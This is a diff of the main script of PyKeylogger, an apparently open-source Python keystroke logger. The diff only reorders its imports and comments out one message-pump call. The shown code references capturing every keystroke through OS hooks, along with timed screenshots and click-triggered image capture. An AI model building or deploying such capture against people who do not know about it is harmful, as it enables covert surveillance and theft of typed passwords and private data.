@@ -20,10 +20,30 @@
 ##
 ##############################################################################
 
+import logging
+from optparse import OptionParser
 import os
 import os.path
-import time
+import re
 import sys
+import threading
+import time
+import Tkinter, tkMessageBox
+import traceback
+
+from configobj import ConfigObj, flatten_errors
+from validate import Validator
+
+from Queue import Empty, Queue
+from controlpanel import PyKeyloggerControlPanel
+from detailedlogwriter import DetailedLogWriterFirstStage
+from myutils import _settings, _cmdoptions, _mainapp
+import myutils
+from onclickimagecapture import OnClickImageCaptureFirstStage
+from timedscreenshot import TimedScreenshotFirstStage
+import version
+
+
 if os.name == 'posix':
     import pyxhook as hooklib
 elif os.name == 'nt':
@@ -33,24 +53,8 @@ else:
     print "OS is not recognised as windows or linux."
     exit()
 
-import re
-from optparse import OptionParser
-import traceback
-import version
-from configobj import ConfigObj, flatten_errors
-from validate import Validator
-from controlpanel import PyKeyloggerControlPanel
-import Tkinter, tkMessageBox
-import myutils
-from Queue import Empty, Queue
-import threading
-import logging
-from myutils import _settings, _cmdoptions, _mainapp
 
 # event processing threads
-from detailedlogwriter import DetailedLogWriterFirstStage
-from onclickimagecapture import OnClickImageCaptureFirstStage
-from timedscreenshot import TimedScreenshotFirstStage
 
 class KeyLogger:
     '''Captures all keystrokes, enqueue events.
@@ -123,6 +127,7 @@ class KeyLogger:
         
         if os.name == 'nt':
             pythoncom.PumpMessages()
+            #pythoncom.PumpWaitingMessages()
         if os.name == 'posix':
             self.hashchecker.start()
             self.hm.start()
